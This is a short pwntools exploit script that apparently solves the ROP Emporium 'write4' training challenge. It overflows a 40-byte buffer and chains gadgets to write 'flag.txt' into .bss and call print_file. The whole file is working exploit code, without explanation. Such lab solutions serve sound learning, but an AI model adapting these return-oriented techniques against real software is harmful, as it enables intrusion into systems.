from pwn import *

context.arch = 'amd64'
p = process('./write4')
e = ELF('./write4')

p.recvuntil(b'> ')

rop = ROP(e)
bss = e.bss()
MOV = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
POP_R14R15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
POP_RDI = 0x0000000000400693 # pop rdi ; ret 
padding = b'A' * 40
text = b'flag.txt'
print_file = e.sym['print_file']
payload = padding + p64(POP_R14R15) + p64(bss) + p64(u64(text)) + p64(MOV) + p64(POP_RDI) + p64(bss) + p64(print_file)
p.sendline(payload)
p.interactive()
